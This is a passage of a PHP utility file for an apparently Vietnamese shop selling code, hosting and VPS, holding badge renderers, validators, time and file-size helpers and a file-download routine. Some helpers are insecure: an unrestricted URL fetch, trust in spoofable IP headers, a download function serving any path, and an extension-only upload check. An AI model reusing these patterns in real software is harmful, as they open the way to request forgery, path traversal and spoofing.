        $show = '<span class="badge badge-warning">Bảo trì</span>';
    } else {
        $show = '<span class="badge badge-success">Hoạt động</span>';
    }
    return $show;
}
function display_ruttien($data)
{
    if ($data == 'xuly') {
        $show = '<span class="badge badge-info">Đang xử lý</span>';
    } else if ($data == 'hoantat') {
        $show = '<span class="badge badge-success">Đã thanh toán</span>';
    } else if ($data == 'huy') {
        $show = '<span class="badge badge-danger">Hủy</span>';
    }
    return $show;
}
function XoaDauCach($text)
{
    return trim(preg_replace('/\s+/', ' ', $text));
}
function display($data)
{
    if ($data == 'HIDE') {
        $show = '<span class="badge badge-danger">ẨN</span>';
    } else if ($data == 'SHOW') {
        $show = '<span class="badge badge-success">HIỂN THỊ</span>';
    }
    return $show;
}
function giamgia($data)
{
    if ($data == 'bancode') {
        $show = '<span class="badge badge-danger">MÃ NGUỒN</span>';
    } else if ($data == 'banhost') {
        $show = '<span class="badge badge-success">HOSTING</span>';
    }else if ($data == 'banvps') {
        $show = '<span class="badge badge-warning">VPS</span>';
    }else if ($data == 'taoweb') {
        $show = '<span class="badge badge-info">TẠO WEB</span>';
    }
    return $show;
}
function giamgia1($data)
{
    if ($data == 'bancode') {
        $show = '<strong>MÃ NGUỒN</strong>';
    } else if ($data == 'banhost') {
        $show = '<strong>HOSTING</strong>';
    }else if ($data == 'banvps') {
        $show = '<strong>VPS</strong>';
    }else if ($data == 'taoweb') {
        $show = '<strong>TẠO WEB</strong>';
    }
    return $show;
}
function status($data)
{
    if ($data == 'xuly') {
        $show = '<span class="badge badge-info">Đang xử lý</span>';
    } else if ($data == 'hoantat') {
        $show = '<span class="badge badge-success">Hoàn tất</span>';
    } else if ($data == 'thanhcong') {
        $show = '<span class="badge badge-success">Thành công</span>';
    } else if ($data == 'success') {
        $show = '<span class="badge badge-success">Success</span>';
    } else if ($data == 'thatbai') {
        $show = '<span class="badge badge-danger">Thất bại</span>';
    } else if ($data == 'error') {
        $show = '<span class="badge badge-danger">Error</span>';
    } else if ($data == 'loi') {
        $show = '<span class="badge badge-danger">Lỗi</span>';
    } else if ($data == 'huy') {
        $show = '<span class="badge badge-danger">Hủy</span>';
    } else if ($data == 'dangnap') {
        $show = '<span class="badge badge-warning">Đang đợi nạp</span>';
    } else if ($data == 2) {
        $show = '<span class="badge badge-success">Hoàn tất</span>';
    } else if ($data == 1) {
        $show = '<span class="badge badge-info">Đang xử lý</span>';
    } else {
        $show = '<span class="badge badge-warning">Khác</span>';
    }
    return $show;
}
function getHeader()
{
    $headers = array();
    $copy_server = array(
        'CONTENT_TYPE' => 'Content-Type',
        'CONTENT_LENGTH' => 'Content-Length',
        'CONTENT_MD5' => 'Content-Md5',
    );
    foreach ($_SERVER as $key => $value) {
        if (substr($key, 0, 5) === 'HTTP_') {
            $key = substr($key, 5);
            if (!isset($copy_server[$key]) || !isset($_SERVER[$key])) {
                $key = str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', $key))));
                $headers[$key] = $value;
            }
        } elseif (isset($copy_server[$key])) {
            $headers[$copy_server[$key]] = $value;
        }
    }
    if (!isset($headers['Authorization'])) {
        if (isset($_SERVER['REDIRECT_HTTP_AUTHORIZATION'])) {
            $headers['Authorization'] = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
        } elseif (isset($_SERVER['PHP_AUTH_USER'])) {
            $basic_pass = isset($_SERVER['PHP_AUTH_PW']) ? $_SERVER['PHP_AUTH_PW'] : '';
            $headers['Authorization'] = 'Basic ' . base64_encode($_SERVER['PHP_AUTH_USER'] . ':' . $basic_pass);
        } elseif (isset($_SERVER['PHP_AUTH_DIGEST'])) {
            $headers['Authorization'] = $_SERVER['PHP_AUTH_DIGEST'];
        }
    }
    return $headers;
}

function check_username($data)
{
    if (preg_match('/^[a-zA-Z0-9_-]{3,16}$/', $data, $matches)) {
        return true;
    } else {
        return false;
    }
}
function check_email($data)
{
    if (preg_match('/^.+@.+$/', $data, $matches)) {
        return true;
    } else {
        return false;
    }
}
function check_phone($data)
{
    if (preg_match('/^\+?(\d.*){3,}$/', $data, $matches)) {
        return true;
    } else {
        return false;
    }
}
function check_url($url)
{
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_HEADER, 1);
    curl_setopt($c, CURLOPT_NOBODY, 1);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_FRESH_CONNECT, 1);
    if (!curl_exec($c)) {
        return false;
    } else {
        return true;
    }
}
function check_zip($img)
{
    $filename = $_FILES[$img]['name'];
    $ext = explode(".", $filename);
    $ext = end($ext);
    $valid_ext = array("zip", "ZIP");
    if (in_array($ext, $valid_ext)) {
        return true;
    }
}
function myip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }
    return $ip_address;
}
function timeAgo($time_ago)
{
    $time_ago = date("Y-m-d H:i:s", $time_ago);
    $time_ago = strtotime($time_ago);
    $cur_time = time();
    $time_elapsed = $cur_time - $time_ago;
    $seconds = $time_elapsed;
    $minutes = round($time_elapsed / 60);
    $hours = round($time_elapsed / 3600);
    $days = round($time_elapsed / 86400);
    $weeks = round($time_elapsed / 604800);
    $months = round($time_elapsed / 2600640);
    $years = round($time_elapsed / 31207680);
    // Seconds
    if ($seconds <= 60) {
        return "$seconds giây trước";
    }
    //Minutes
    else if ($minutes <= 60) {
        return "$minutes phút trước";
    }
    //Hours
    else if ($hours <= 24) {
        return "$hours tiếng trước";
    }
    //Days
    else if ($days <= 7) {
        if ($days == 1) {
            return "Hôm qua";
        } else {
            return "$days ngày trước";
        }
    }
    //Weeks
    else if ($weeks <= 4.3) {
        return "$weeks tuần trước";
    }
    //Months
    else if ($months <= 12) {
        return "$months tháng trước";
    }
    //Years
    else {
        return "$years năm trước";
    }
}
function dirToArray($dir)
{

    $result = array();

    $cdir = scandir($dir);
    foreach ($cdir as $key => $value) {
        if (!in_array($value, array(".", ".."))) {
            if (is_dir($dir . DIRECTORY_SEPARATOR . $value)) {
                $result[$value] = dirToArray($dir . DIRECTORY_SEPARATOR . $value);
            } else {
                $result[] = $value;
            }
        }
    }

    return $result;
}

function realFileSize($path)
{
    if (!file_exists($path)) {
        return false;
    }

    $size = filesize($path);

    if (!($file = fopen($path, 'rb'))) {
        return false;
    }

    if ($size >= 0) { //Check if it really is a small file (< 2 GB)
        if (fseek($file, 0, SEEK_END) === 0) { //It really is a small file
            fclose($file);
            return $size;
        }
    }

    //Quickly jump the first 2 GB with fseek. After that fseek is not working on 32 bit php (it uses int internally)
    $size = PHP_INT_MAX - 1;
    if (fseek($file, PHP_INT_MAX - 1) !== 0) {
        fclose($file);
        return false;
    }

    $length = 1024 * 1024;
    while (!feof($file)) { //Read the file until end
        $read = fread($file, $length);
        $size = bcadd($size, $length);
    }
    $size = bcsub($size, $length);
    $size = bcadd($size, strlen($read));

    fclose($file);
    return $size;
}
function FileSizeConvert($bytes)
{
    $bytes = floatval($bytes);
    $arBytes = array(
        0 => array(
            "UNIT" => "TB",
            "VALUE" => pow(1024, 4),
        ),
        1 => array(
            "UNIT" => "GB",
            "VALUE" => pow(1024, 3),
        ),
        2 => array(
            "UNIT" => "MB",
            "VALUE" => pow(1024, 2),
        ),
        3 => array(
            "UNIT" => "KB",
            "VALUE" => 1024,
        ),
        4 => array(
            "UNIT" => "B",
            "VALUE" => 1,
        ),
    );

    foreach ($arBytes as $arItem) {
        if ($bytes >= $arItem["VALUE"]) {
            $result = $bytes / $arItem["VALUE"];
            $result = str_replace(".", ",", strval(round($result, 2))) . " " . $arItem["UNIT"];
            break;
        }
    }
    return $result;
}
function GetCorrectMTime($filePath)
{

    $time = filemtime($filePath);

    $isDST = (date('I', $time) == 1);
    $systemDST = (date('I') == 1);

    $adjustment = 0;

    if ($isDST == false && $systemDST == true) {
        $adjustment = 3600;
    } else if ($isDST == true && $systemDST == false) {
        $adjustment = -3600;
    } else {
        $adjustment = 0;
    }

    return ($time + $adjustment);
}
function DownloadFile($file)
{ // $file = include path
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}